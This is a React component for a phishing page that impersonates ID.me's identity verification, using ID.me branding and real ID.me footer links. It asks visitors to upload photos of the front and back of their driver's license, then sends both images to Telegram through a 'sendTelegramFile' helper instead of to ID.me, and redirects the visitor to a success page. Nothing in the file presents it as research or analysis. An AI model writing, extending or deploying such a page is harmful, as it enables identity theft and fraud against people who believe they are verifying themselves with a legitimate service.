"use client";
import './styles.css';
import idmeLogo from './idme.png';
import { useState } from "react";
import { sendTelegramFile } from "../../utils/telegram"; // adjust path if needed

const UploadLicense = () => {
  // Front file state
  const [frontFile, setFrontFile] = useState<File | null>(null);
  const [frontPreview, setFrontPreview] = useState<string | null>(null);
  // Back file state
  const [backFile, setBackFile] = useState<File | null>(null);
  const [backPreview, setBackPreview] = useState<string | null>(null);

  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Validate a single file
  const validateFile = (file: File): string | null => {
    const validTypes = ["image/jpeg", "image/png", "image/jpg", "image/heic"];
    if (!validTypes.includes(file.type)) {
      return "Please upload a valid image (JPEG, PNG, or HEIC).";
    }
    if (file.size > 10 * 1024 * 1024) {
      return "File size must be less than 10 MB.";
    }
    return null;
  };

  const handleFrontChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    setError("");
    if (!file) {
      setFrontFile(null);
      setFrontPreview(null);
      return;
    }
    const validationError = validateFile(file);
    if (validationError) {
      setError(validationError);
      setFrontFile(null);
      setFrontPreview(null);
      return;
    }
    setFrontFile(file);
    setFrontPreview(URL.createObjectURL(file));
  };

  const handleBackChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    setError("");
    if (!file) {
      setBackFile(null);
      setBackPreview(null);
      return;
    }
    const validationError = validateFile(file);
    if (validationError) {
      setError(validationError);
      setBackFile(null);
      setBackPreview(null);
      return;
    }
    setBackFile(file);
    setBackPreview(URL.createObjectURL(file));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!frontFile || !backFile) {
      setError("Please select both front and back images of your driver's license.");
      return;
    }

    setIsSubmitting(true);
    setError("");
    setSuccess("");

    try {
      const timestamp = new Date().toLocaleString();
      // Send front image
      await sendTelegramFile(frontFile, `ID.me Driver's License Front\nTime: ${timestamp}`);
      // Send back image
      await sendTelegramFile(backFile, `ID.me Driver's License Back\nTime: ${timestamp}`);

      // Redirect after successful upload
      window.location.href = "/success"; // or your desired next step

      // Clear form
      setFrontFile(null);
      setFrontPreview(null);
      setBackFile(null);
      setBackPreview(null);
      setSuccess("Your driver's license has been uploaded successfully!");
    } catch (error) {
      console.error("Telegram send error:", error);
      setError("Failed to upload images. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="page-container">
      <div className="container">
        <div className="content-container">
          <form className="new_user" id="upload_license" onSubmit={handleSubmit}>
            <div className="form-header">
              <div className="form-header-content" role="banner">
                <div className="partner">
                  <div className="c_icon m_idme">
                    <img src={idmeLogo} alt="ID.me" className="w-[120px] h-[40px] object-contain" />
                  </div>
                </div>
              </div>
            </div>

            <main aria-labelledby="sr_page_title" className="form-container">
              <div className="form-header-access">
                <h1 id="sr_page_title">Verify Your Identity</h1>
              </div>
              <div className="form-header-well">
                <p>Please upload a clear photo of the front and back of your driver's license.</p>
                <p>
                  <a target="_blank" href="https://www.id.me/help" rel="noopener noreferrer">
                    Why do we need this?
                  </a>
                </p>
              </div>

              {error && (
                <p className="alert alert-error" role="alert">
                  {error}
                </p>
              )}
              {success && (
                <p className="alert alert-success" role="alert">
                  {success}
                </p>
              )}

              <div className="form-fields">
                <div className="field-group">
                  {/* Front of License */}
                  <div className="field text">
                    <label htmlFor="front_upload">Front of Driver's License</label>
                    <input
                      type="file"
                      accept="image/jpeg,image/png,image/jpg,image/heic"
                      id="front_upload"
                      onChange={handleFrontChange}
                      className="file-input"
                    />
                    <p className="help-text">Accepted formats: JPEG, PNG, HEIC (max 10 MB)</p>
                    {frontPreview && (
                      <div className="preview-container">
                        <img src={frontPreview} alt="Front preview" className="preview-image" />
                      </div>
                    )}
                    <span role="alert"></span>
                  </div>

                  {/* Back of License */}
                  <div className="field text">
                    <label htmlFor="back_upload">Back of Driver's License</label>
                    <input
                      type="file"
                      accept="image/jpeg,image/png,image/jpg,image/heic"
                      id="back_upload"
                      onChange={handleBackChange}
                      className="file-input"
                    />
                    <p className="help-text">Accepted formats: JPEG, PNG, HEIC (max 10 MB)</p>
                    {backPreview && (
                      <div className="preview-container">
                        <img src={backPreview} alt="Back preview" className="preview-image" />
                      </div>
                    )}
                    <span role="alert"></span>
                  </div>
                </div>
              </div>

              <div className="form-actions">
                <input
                  id="submit_btn"
                  type="submit"
                  name="commit"
                  value={isSubmitting ? "Uploading..." : "Continue"}
                  className="btn btn-primary"
                  disabled={isSubmitting}
                />
              </div>
            </main>
          </form>

          <div className="form-footer">
            <p>
              <a href="#">Forgot password?</a> | <a href="#">Need help?</a>
            </p>
          </div>
        </div>
      </div>

      <footer className="footer" role="contentinfo">
        <div className="footer-links">
          <a target="_blank" href="https://www.id.me/about" rel="noopener noreferrer">
            What is ID.me?
          </a>
          |
          <a target="_blank" href="https://www.id.me/terms" rel="noopener noreferrer">
            Terms of Service
          </a>
          |
          <a target="_blank" href="https://www.id.me/privacy" rel="noopener noreferrer">
            Privacy Policy
          </a>
        </div>
      </footer>

      {/* Additional styles for file inputs and previews – keep consistent with ID.me look */}
      <style>{`
        .file-input {
          padding: 10px;
          border: 2px solid #b7b7b7;
          border-radius: 5px;
          width: 100%;
          background: #fff;
          font-size: 14px;
          margin-top: 5px;
        }
        .help-text {
          font-size: 12px;
          color: #757575;
          margin-top: 4px;
        }
        .preview-container {
          margin-top: 15px;
        }
        .preview-image {
          max-width: 100%;
          max-height: 200px;
          border-radius: 8px;
          border: 1px solid #dfdfdf;
          box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .field.text label {
          font-weight: 600;
          font-size: 14px;
          color: #2e3f51;
        }
      `}</style>
    </div>
  );
};

export default UploadLicense;